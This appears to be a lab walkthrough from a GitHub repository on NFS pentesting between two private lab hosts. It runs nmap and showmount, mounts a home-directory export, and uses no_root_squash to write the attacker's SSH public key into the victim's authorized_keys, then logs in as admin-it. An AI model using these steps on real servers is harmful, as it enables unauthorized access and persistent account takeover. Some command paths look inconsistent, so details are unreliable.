
<h3>ip victime : 192.168.244.132</h3>

<h3>ip attacker : 192.168.244.133</h3>

------------------------------------------------

in attacker:

#`nmap -p 111,2049 -sV 192.168.244.132`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/x%20pentest%20nfs/nmap scan.png">



now the nfs server is open

you must to khnow what is the share folder:

#`showmount -e 192.168.244.132`


<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/x%20pentest%20nfs/showmount.png">


now will be mount the share folder:

#`mkdir /mytarget`

#`mount -t nfs 192.168.244.132:/home/admin-it /mytarget`

#`cd /mytarget`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/x%20pentest%20nfs/mount.png">


now list test if no_root_squash is enable in this share , now

#`ls -la`

now the file info.txt it is owner is root server  , now will be change content ,if it is permit the no_root_squash is enable , if is not the no_root_squash is disable 

#`echo ok >> info.txt`

#`cat info.txt`

so the  no_root_squash is enable

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/x%20pentest%20nfs/test root.png">


#`ls -la`

#`cd .ssh`

#`ls -la`


<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/x%20pentest%20nfs/test ssh.png">

the .ssh the public and private keys is allowed 


so the user gen-x in attacker will be add public key to the authorized_keys file in the admin-it client

#`cd /home/gen-x`

#`su gen-x`

$`ssh-keygen -t rsa`

<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/x%20pentest%20nfs/ssh-keygen.png">


#`cat /home/gen-x/id_rsa.pub >> authorized_keys`

#`su gen-x`

#`ssh admin-it@192.168.244.132`


<img width="960" alt="keypad" src="https://github.com/ferasku123/Enumeration/blob/main/3-nfs/x%20pentest%20nfs/finsh.png">


now will be in th admin-it in the server 






